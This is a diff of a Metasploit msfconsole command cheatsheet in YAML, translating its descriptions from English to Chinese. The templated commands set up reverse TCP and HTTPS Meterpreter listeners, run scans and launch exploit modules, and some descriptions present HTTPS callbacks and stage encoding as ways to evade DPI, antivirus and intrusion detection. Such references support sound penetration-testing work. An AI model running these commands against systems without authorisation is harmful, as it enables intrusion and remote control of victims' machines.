@@ -3,96 +3,83 @@ tags: [pentest, exploitation, network, security, enumeration, framework, post-ex
 
 actions:
   # === CORE OPERATIONS ===
-  - title: msfconsole - launch quiet
+  - title: msfconsole - 静默启动
     desc: |
-      Start the Metasploit console without displaying the large ASCII art banner. 
-      This is useful for keeping the terminal clean or when piping output to other tools. 
-      It speeds up the startup process slightly and is preferred in automated environments.
+      启动 Metasploit 控制台，不显示大型 ASCII 艺术横幅。用于保持终端干净或将输出管道传给其他工具。
+      它略微加快启动过程，在自动化环境中更受青睐。
     command: "msfconsole -q"
 
-  - title: msfconsole - execute specific command
+  - title: msfconsole - 执行指定命令
     desc: |
-      Run a specific set of Metasploit commands directly from the system shell and then remain in the console. 
-      This is highly effective for automating the initial setup of a module or handler. 
-      You can chain multiple commands by separating them with semicolons within the quotes.
+      直接从系统 shell 运行一组特定的 Metasploit 命令，然后留在控制台中。这对自动化模块或 handler 的初始设置非常有效。
+      你可以在引号内用分号分隔多个命令来串联执行。
     command: "msfconsole -x \"{{command|help}}\""
 
-  - title: msfconsole - run resource file
+  - title: msfconsole - 运行资源文件
     desc: |
-      Execute a series of Metasploit commands stored in an external file (resource script). 
-      Resource files (.rc) are essential for consistent environment setup, such as configuring database connections or complex listeners. 
-      Using scripts helps avoid manual entry errors during critical phases of a penetration test.
+      执行存储在外部文件（资源脚本）中的一系列 Metasploit 命令。资源文件（.rc）对于一致的环境设置至关重要，例如配置数据库连接或复杂监听器。
+      使用脚本有助于避免渗透测试关键阶段的人工输入错误。
     command: "msfconsole -r {{resource_file|setup.rc}}"
 
-  - title: msfconsole - search for modules
+  - title: msfconsole - 搜索模块
     desc: |
-      Search the Metasploit database for specific exploits, payloads, or auxiliary modules based on a keyword. 
-      The results can be filtered by platform, rank, or CVE ID to quickly find the most relevant exploit for a target. 
-      This command is the primary method for discovering capabilities within the framework.
+      根据关键字在 Metasploit 数据库中搜索特定的 exploit、payload 或 auxiliary 模块。结果可按平台、rank 或 CVE ID 过滤，以快速找到最相关的 exploit。
+      此命令是发现框架内功能的主要方法。
     command: "msfconsole -q -x \"search {{keyword}}; exit\""
 
   # === HANDLERS & LISTENERS ===
-  - title: msfconsole - windows reverse tcp handler
+  - title: msfconsole - Windows 反向 TCP handler
     desc: |
-      Establish a multi-handler listener for a Windows 32-bit staged Meterpreter reverse TCP connection. 
-      This is the standard listener used for most basic Windows exploitations where a stable callback is expected. 
-      Ensure your firewall allows incoming connections on the specified LPORT.
+      为 Windows 32 位分阶段 Meterpreter 反向 TCP 连接建立 multi-handler 监听器。这是大多数基础 Windows 利用所使用的标准监听器，预期会有稳定的回连。
+      确保你的防火墙允许在指定 LPORT 上的入站连接。
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport|4444}}; run\""
 
-  - title: msfconsole - windows reverse https handler
+  - title: msfconsole - Windows 反向 HTTPS handler
     desc: |
-      Set up a listener for a Windows 64-bit staged Meterpreter connection over HTTPS. 
-      Using HTTPS is a common technique for bypassing deep packet inspection (DPI) and egress filtering. 
-      The traffic is encrypted, making it look like legitimate web browsing to many network monitoring tools.
+      为 Windows 64 位分阶段 Meterpreter 通过 HTTPS 连接设置监听器。使用 HTTPS 是绕过深度包检测（DPI）和出站过滤的常用技术。
+      流量经过加密，对许多网络监控工具来说看起来像合法的 Web 浏览。
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
 
-  - title: msfconsole - windows reverse https unstaged handler
+  - title: msfconsole - Windows 反向 HTTPS 非分阶段 handler
     desc: |
-      Configure a listener for an unstaged (standalone) Windows 64-bit reverse HTTPS payload. 
-      Unstaged payloads do not require a second stage download, making them more resilient in unstable network conditions. 
-      Note that the resulting executable file will be significantly larger than a staged version.
+      为非分阶段（独立）的 Windows 64 位反向 HTTPS payload 配置监听器。非分阶段 payload 不需要第二阶段下载，在不稳定的网络条件下更具韧性。
+      注意生成的执行文件会比分阶段版本大得多。
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
 
-  - title: msfconsole - encoded stage handler
+  - title: msfconsole - 编码阶段 handler
     desc: |
-      Launch a listener that applies encoding to the payload stage before sending it to the target. 
-      This technique is used to evade signature-based antivirus or network intrusion detection systems that scan the second stage transfer. 
-      The x64/xor_dynamic encoder is a popular choice for modern 64-bit Windows targets.
+      启动一个在将 payload 阶段发送给目标前对其应用编码的监听器。此技术用于规避扫描第二阶段传输的基于签名的杀软或网络入侵检测系统。
+      x64/xor_dynamic 编码器是现代 64 位 Windows 目标的热门选择。
     command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; set EnableStageEncoding true; set StageEncoder {{encoder|x64/xor_dynamic}}; run\""
 
   # === DATABASE & RECONNAISSANCE ===
-  - title: msfconsole - database nmap scan
+  - title: msfconsole - 数据库 Nmap 扫描
     desc: |
-      Execute an Nmap scan from within Metasploit and automatically save the results into the internal database. 
-      This allows you to track discovered hosts, open ports, and services within a unified workspace. 
-      A running PostgreSQL database is required for the information to be stored permanently.
+      在 Metasploit 内执行 Nmap 扫描，并自动将结果保存到内部数据库。这让你可以在统一工作区内跟踪发现的主机、开放端口和服务。
+      需要运行 PostgreSQL 数据库才能永久存储信息。
     command: "msfconsole -q -x \"db_nmap {{nmap_flags|-sV}} {{target}}; exit\""
 
-  - title: msfconsole - export database
+  - title: msfconsole - 导出数据库
     desc: |
-      Export all data from the current workspace, including hosts, services, and discovered credentials, to an XML file. 
-      This is a vital step for documentation, reporting, or moving data between different Metasploit installations. 
-      The exported file can be re-imported later using the db_import command.
+      将当前工作区的所有数据（包括主机、服务和发现的凭据）导出到 XML 文件。这是文档化、报告或在不同 Metasploit 安装之间迁移数据的关键步骤。
+      导出的文件之后可用 db_import 命令重新导入。
     command: "msfconsole -q -x \"db_export -f xml {{output_path|results.xml}}; exit\""
 
-  - title: msfconsole - manage workspaces
+  - title: msfconsole - 管理工作区
     desc: |
-      List all existing workspaces within the Metasploit database or create a new one. 
-      Workspaces allow you to segregate data for different projects or networks, preventing target confusion. 
-      It is best practice to create a unique workspace for every new engagement.
+      列出 Metasploit 数据库中所有现有工作区，或创建一个新工作区。工作区让你为不同项目或网络隔离数据，防止目标混淆。
+      最佳实践是为每次新的测试创建唯一工作区。
     command: "msfconsole -q -x \"workspace -a {{workspace_name|project_alpha}}; workspace; exit\""
 
   # === EXPLOITATION EXAMPLES ===
-  - title: msfconsole - run auxiliary scanner
+  - title: msfconsole - 运行 auxiliary 扫描器
     desc: |
-      Execute an auxiliary module to perform tasks like port scanning, service identification, or brute-forcing. 
-      Auxiliary modules are used for information gathering and do not typically provide a shell. 
-      This example shows how to run a generic scanner against a specific target range.
+      执行 auxiliary 模块以执行端口扫描、服务识别或暴力破解等任务。auxiliary 模块用于信息收集，通常不提供 shell。
+      此示例展示如何针对特定目标范围运行通用扫描器。
     command: "msfconsole -q -x \"use {{module|auxiliary/scanner/portscan/tcp}}; set RHOSTS {{target}}; run; exit\""
 
-  - title: msfconsole - execute exploit with auto-target
+  - title: msfconsole - 使用自动目标执行 exploit
     desc: |
-      Quickly launch a specific exploit module against a target while letting Metasploit attempt to determine the target OS/version automatically. 
-      This command uses the 'run' command with pre-set variables for target and host settings. 
-      Always verify the module options with the 'options' command before executing in a production environment.
+      快速对目标启动特定 exploit 模块，同时让 Metasploit 尝试自动判断目标 OS/版本。此命令使用 run 命令以及预设的目标和主机变量。
+      在生产环境执行前务必用 options 命令验证模块选项。
     command: "msfconsole -q -x \"use {{exploit_path}}; set RHOSTS {{target}}; set LHOST {{lhost}}; run\""
